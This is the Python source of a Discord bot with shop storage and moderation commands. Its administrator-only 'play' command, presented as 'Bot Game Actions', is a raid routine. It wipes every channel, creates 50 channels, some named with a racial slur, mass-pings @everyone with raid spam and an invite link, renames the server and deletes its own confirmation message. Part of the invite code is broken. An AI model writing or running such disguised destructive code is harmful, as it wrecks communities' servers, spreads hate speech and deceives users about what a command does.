import discord
from discord.ext import commands
import json
import asyncio
from datetime import datetime
import random


# === Configuration ===
TOKEN = 'your token' 
GUILD_ID = 123456789 
PRODUCTS_FILE = "products.json"
ORDERS_FILE = "orders.json"
INVITE_LINK = "your_bot_link"

# === Initialize bot with intents ===
intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
intents.members = True  # Needed to get member list and check boost
bot = commands.Bot(command_prefix=['!'], intents=intents)
tree = bot.tree
start_time = datetime.utcnow()

# === Data storage in bot ===
products = []
orders = {}


# === DATA STORAGE SYSTEM ===
def load_data():
    global products, orders
    try:
        with open(PRODUCTS_FILE, "r", encoding="utf-8") as f:
            products = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        products = []

    try:
        with open(ORDERS_FILE, "r", encoding="utf-8") as f:
            orders = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        orders = {}

def save_products():
    with open(PRODUCTS_FILE, "w", encoding="utf-8") as f:
        json.dump(products, f, indent=4, ensure_ascii=False)

def save_orders():
    with open(ORDERS_FILE, "w", encoding="utf-8") as f:
        json.dump(orders, f, indent=4, ensure_ascii=False)

# === ADMIN COMMANDS ===
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason="No reason provided"):
    """Ban a member"""
    await member.ban(reason=reason)
    await ctx.send(f"✅ Banned {member.mention}! Reason: {reason}")

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason="No reason provided"):
    """Kick a member"""
    await member.kick(reason=reason)
    await ctx.send(f"✅ Kicked {member.mention}! Reason: {reason}")


class ConfirmView(discord.ui.View):
    def __init__(self, author):
        super().__init__(timeout=30)
        self.author = author
        self.value = None  # will store True/False after button press

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        # Only allow command author to interact with the view
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("You do not have permission to press this button.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="Confirm Play", style=discord.ButtonStyle.danger)
    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.value = True
        self.stop()
        await interaction.response.edit_message(content="✅ Proceeding with deletion...", view=None)

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.value = False
        self.stop()
        await interaction.response.edit_message(content="❌ Delete command cancelled.", view=None)

async def purge_channel(channel: discord.TextChannel):
    while True:
        deleted = await channel.purge(limit=100)
        if len(deleted) == 0:
            break
        await asyncio.sleep(1)

@bot.command(name="deleted")
@commands.has_permissions(manage_messages=True)
async def deleted_command(ctx):
    view = ConfirmView(ctx.author)
    await ctx.send("⚠️ Are you sure you want to delete all messages in this channel?", view=view)

    # Wait for user response (button press)
    await view.wait()

    if view.value is None:
        await ctx.send("⌛ Timeout, no action was taken.")
    elif view.value:
        await purge_channel(ctx.channel)
        await ctx.send(f"✅ Deleted all messages in **#{ctx.channel.name}** by {ctx.author.mention}.")
    else:
        await ctx.send("❌ Delete command cancelled.")

@bot.command(name="play")
@commands.has_permissions(administrator=True)
async def play(ctx):
    view = ConfirmView(ctx.author)
    await ctx.send("⚠️ Are you sure you want to run the `play` command? (Bot Game Actions)", view=view)
    await view.wait()

    if view.value is None:
        # Timeout
        await ctx.send("⌛ Confirmation timeout, command was cancelled.")
        return

    if view.value is False:
        # User cancelled
        return

    # If Yes, continue with command
    await ctx.message.delete()

    guild = ctx.guild
    deleted_count = 0

    # 1. DELETE ALL EXISTING CHANNELS
    try:
        for ch in list(guild.channels):
            try:
                await ch.delete(reason="Full wipe before play")
                deleted_count += 1
                await asyncio.sleep(1)  # Avoid rate limits
            except Exception as e:
                print(f"[ERROR] Deleting channel {ch.name}: {e}")
    except Exception as e:
        print(f"[ERROR] Could not get channel list: {e}")

    # 2. CREATE INVITE LINK
    invite_link = "https://discord.gg/abcd"
    temp_channel = None
    try:
        invite_obj = await temp_channel.create_invite(max_uses=0, unique=True)
    except Exception as e:
        print(f"[ERROR] Could not create invite link: {e}")

    created_channels = []

    icon_list = ["🔥", "💥", "⚡", "🚀", "👑", "💣", "🪬", "🧿", "💀"]
    random_list = ["smart brain on top", "dumb brain 🤣", "everybody say nigga", "do you know what skill is", "monk master"]

    # 3. CREATE 50 TEXT CHANNELS
    async def create_channel(index):
        channel_name = random.choice(random_list)
        icon = random.choice(icon_list)
        name = f"{channel_name}-{icon}-{index}"
        try:
            channel = await guild.create_text_channel(name)
            created_channels.append(channel)
        except Exception as e:
            print(f"[ERROR] Error creating channel: {e}")

    await asyncio.gather(*(create_channel(i+1) for i in range(50)))

    gif_list = [
        "https://i.pinimg.com/originals/80/7f/fe/807ffe8cddceac95661fe553adc3de26.gif"
    ]

    # 4. SPAM MESSAGES + GIF
    async def spam_channel(channel):
        try:
            for _ in range(10):
                await channel.send("@everyone Smart Brain on top 🧿")
                await channel.send(f"➡️ Join now: {invite_link}")
                await channel.send("🔥 Raid by Smart Brain |Bot by Nyx 💀")
                await channel.send(random.choice(gif_list))
        except Exception as e:
            print(f"[ERROR] Spam error in channel {channel.name}: {e}")

    await asyncio.gather(*(spam_channel(ch) for ch in created_channels))

    # 5. CHANGE SERVER NAME
    try:
        await guild.edit(name="Smart Brain 0n T0p")
    except Exception as e:
        print(f"[ERROR] Changing server name: {e}")

    # 6. DELETE TEMP CHANNEL
    try:
        if temp_channel:
            await temp_channel.delete(reason="Deleting temp channel")
    except:
        pass

    # 7. SEND CONFIRMATION (hidden)
    try:
        msg = await ctx.send("✅ Spam completed, server renamed, and 50 channels created!")
        await asyncio.sleep(10)
        await msg.delete()
    except:
        pass

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")

bot.run(TOKEN)